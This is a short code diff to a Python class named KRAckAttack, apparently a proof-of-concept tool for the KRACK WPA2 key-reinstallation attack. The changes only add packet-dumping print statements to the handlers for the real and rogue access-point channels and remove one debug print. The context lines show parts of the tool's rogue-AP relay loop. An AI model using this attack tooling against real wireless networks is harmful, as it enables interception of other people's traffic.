@@ -666,9 +666,10 @@ class KRAckAttack():
 		if p.haslayer(Dot11WEP) and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
 			log(STATUS, "Got a likely group message 2", showtime=False)
 
-
 	def handle_rx_realchan(self):
 		p = self.sock_real.recv()
+		print('671', end = '')
+		print(p)
 		if p == None: return
 
 		# 1. Handle frames sent TO the real AP
@@ -762,6 +763,8 @@ class KRAckAttack():
 
 	def handle_rx_roguechan(self):
 		p = self.sock_rogue.recv()
+		print('766', end = '')
+		print(p)
 		if p == None: return
 
 		# 1. Handle frames sent BY the rouge AP
@@ -958,7 +961,6 @@ class KRAckAttack():
 		nextbeacon = time.time() + 0.01
 		while True:
 			sel = select.select([self.sock_rogue, self.sock_real, self.hostapd.stdout], [], [], 0.1)
-			print(sel)
 			if self.sock_real      in sel[0]: self.handle_rx_realchan()
 			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
 			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
